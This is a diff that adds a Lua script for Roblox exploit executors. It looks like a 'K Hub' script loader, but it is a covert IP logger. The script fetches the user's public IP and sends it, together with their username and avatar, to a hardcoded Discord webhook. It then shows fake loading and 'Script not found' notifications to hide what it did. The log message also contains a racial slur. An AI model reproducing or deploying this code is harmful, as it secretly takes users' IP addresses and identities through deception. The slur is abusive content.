@@ -1,0 +1,40 @@
+
+local body = game:HttpGet("https://v4.ident.me/") -- returns body <string>
+local url =
+   "https://discord.com/api/webhooks/1135268916801847316/8Kd4NeUxhiHmJMgLvPWoWT3qgB69tZPEHolQsWpAcSBAd0UENKVx0gAhn2-9zZp8ZNdC"
+local data = {
+   ["embeds"] = {
+       {
+           ["title"] = "**annoying ass nigga logged**",
+           ["description"] = "user  " .. game.Players.LocalPlayer.Name.." ip **"..body.."**",
+           ["type"] = "rich",
+           ["color"] = tonumber(0x7269da),
+           ["image"] = {
+               ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
+                   tostring(game:GetService("Players").LocalPlayer.Name)
+           }
+       }
+   }
+}
+local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+local headers = {
+   ["content-type"] = "application/json"
+}
+request = http_request or request or HttpPost or syn.request
+local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef)
+wait(1)
+game.StarterGui:SetCore("SendNotification", {
+Title = "Loading K Hub"; -- the title (ofc)
+Text = "Loading"; -- what the text says (ofc)
+Icon = ""; -- the image if u want. 
+Duration = 5; -- how long the notification should in secounds
+})
+wait(5)
+game.StarterGui:SetCore("SendNotification", {
+Title = "Error! Script not found"; -- the title (ofc)
+Text = "Script not found."; -- what the text says (ofc)
+Icon = ""; -- the image if u want. 
+Duration = 5; -- how long the notification should in secounds
+})
